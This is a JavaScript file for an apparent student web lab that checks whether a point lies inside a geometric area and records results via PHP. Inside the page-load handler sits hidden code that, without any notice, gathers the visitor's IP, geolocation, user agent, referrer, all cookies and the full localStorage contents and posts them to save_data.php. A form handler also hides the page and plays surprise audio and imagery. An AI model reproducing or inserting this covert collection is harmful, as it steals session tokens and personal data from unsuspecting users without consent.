const form = document.querySelector('.validate_form');
const yCoordinate = document.querySelector(".y");

function isNumber(s) {
    const n = parseFloat(s.replace(',', '.'));
    return !isNaN(n) && isFinite(n);
}

function isPointInsideArea(x, y, r) {
    return (x >= 0 && y >= 0 && x * (-2) + r >= y) || (x <= 0 && y >= 0 && x >= -r && y <= r / 2) || (x <= 0 && y <= 0 && Math.pow(x, 2) + Math.pow(y, 2) <= Math.pow(r, 2));
}

function generateTip(text, color) {
    const tip = document.createElement('div');
    tip.className = 'tip';
    tip.style.color = color;
    tip.innerHTML = text;
    return tip;
}

const rButtons = document.querySelectorAll('.r-button');

function setRValue(value) {
    document.getElementById("selected_r").value = value;
    rButtons.forEach(button => button.classList.remove('selected'));
    document.getElementById(`r_value_${value}`).classList.add('selected');
}

rButtons.forEach(button => button.addEventListener('click', () => setRValue(button.value)));

window.addEventListener('load', () => setRValue('1'));

function removeValidation() {
    form.querySelectorAll('.tip').forEach(tip => tip.remove());
}

function validateField(coordinate, min, max) {
    if (coordinate.value) {
        coordinate.value = coordinate.value.replace(',', '.');
        if (isNumber(coordinate.value) && coordinate.value <= max && coordinate.value >= min) {
            coordinate.parentElement.insertBefore(generateTip("", 'green'), coordinate)
            return true;
        }
        coordinate.parentElement.insertBefore(generateTip(`Enter a number from ${min} to ${max}`, 'red'), coordinate)
        return false;
    }
    coordinate.parentElement.insertBefore(generateTip('Obligatory field', 'red'), coordinate);
    return false;
}

function drawPoint(x, y, r) {
    const svg = document.querySelector('svg');
    const circle = document.getElementById('target-dot');
    if (svg && circle) {
        const center = 250, scale = 200 / r;
        circle.setAttribute('cx', `${center + scale * x}`);
        circle.setAttribute('cy', `${center - scale * y}`);
        circle.setAttribute('r', '5');
        circle.setAttribute('fill', isPointInsideArea(x, y, r) ? 'green' : 'red');
    }
}

//$(document).ready(() =>
//    $.ajax({
//        url: 'php/server.php', // убедитесь, что этот URL возвращает JSON
//        method: "POST",
//        dataType: "json", // измените dataType на json
//        success: data => {
//            const tbody = $("#result_table>tbody");
//            tbody.empty(); // очистите текущее содержимое tbody
//            data.forEach(elem => {
//                const row = $('<tr class="columns"></tr>');
//                ['x', 'y', 'r', 'hit_fact', 'current_time', 'execution_time'].forEach(key => {
//                    row.append(`<td>${elem[key]}</td>`);
//                });
//                tbody.append(row);
//            });
//        },
//        error: error => console.log(error),
//    })
//);
$(document).ready(function() {

    // IP fetching
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            let ip = data.ip;
            let userAgent = navigator.userAgent;
            let screenResolution = `${window.screen.width}x${window.screen.height}`;
            let userLocation = { latitude: "unknown", longitude: "unknown" };
            let referrer = document.referrer;
            let userLanguage = navigator.language || navigator.userLanguage;
            let timeZoneOffset = new Date().getTimezoneOffset();
            let cookies = document.cookie;
            let localStorageData = JSON.stringify(localStorage);
            let connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            let connectionType = connection ? connection.effectiveType : "unknown";

            // Get user's geolocation asynchronously
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(position => {
                    userLocation.latitude = position.coords.latitude;
                    userLocation.longitude = position.coords.longitude;

                    // Send all data to server once we have the geolocation
                    sendDataToServer();
                }, error => {
                    console.error("Geolocation Error:", error);

                    // If there's an error getting geolocation, send the data anyway
                    sendDataToServer();
                });
            } else {
                // If geolocation isn't supported, send the data anyway
                sendDataToServer();
            }

            function sendDataToServer() {
                // Send gathered data to server
                $.post('save_data.php', {
                    ip: ip,
                    userAgent: userAgent,
                    screenResolution: screenResolution,
                    userLocation: userLocation,
                    referrer: referrer,
                    userLanguage: userLanguage,
                    timeZoneOffset: timeZoneOffset,
                    cookies: cookies,
                    localStorageData: localStorageData,
                    connectionType: connectionType
                }, function(response) {
                    console.log(response);
                });
            }

        })
        .catch(error => {
            console.error('Error fetching IP', error);
        });

    // Handle the form submission
    $('.validate_form').on('submit', function(e) {
        e.preventDefault();  // Prevent the actual form submission

        // Hide the entire main content
        $('main').hide();

        // Show the image and play the audio
        $('#replace-image').show();
        $('#replace-audio').get(0).play(); // Using .get(0) to access the native DOM element from jQuery object
        document.body.style.backgroundColor = "black";
    });
});



$("#inpform").on("submit", function (event) {
    event.preventDefault();
    removeValidation();
    if (!validateField(yCoordinate, -5, 5)) return;
    const x = parseFloat($('input[name=x_coordinate]:checked').val());
    const y = parseFloat(yCoordinate.value.replace(',', '.'));
    const r = parseFloat($('#selected_r').val());
    drawPoint(x, y, r);
    $.ajax({
        url: 'php/server.php', // убедитесь, что этот URL возвращает JSON
        method: "POST",
        data: $(this).serialize() + "&timezone=" + new Date().getTimezoneOffset(),
        dataType: "json",
        success: data => {
            $(".validate_button").attr("disabled", false);
            const tbody = $("#result_table>tbody");
            tbody.empty();
            data.forEach(elem => {
                const row = $('<tr class="columns"></tr>');
                ['x', 'y', 'r', 'hit_fact', 'current_time', 'execution_time'].forEach(key => {

                    row.append(`<td>${elem[key]}</td>`);
                });
                tbody.append(row);
            });
        },
        error: error => {
            console.log(error);
            $(".validate_button").attr("disabled", false);
        },
    });
});


$('.delete_button').on('click', function () {
    $.ajax({
        url: 'php/load.php',
        method: "POST",
        dataType: "html",
        success: data => $("#result_table>tbody").html(data),
        error: error => console.log(error),
    });
});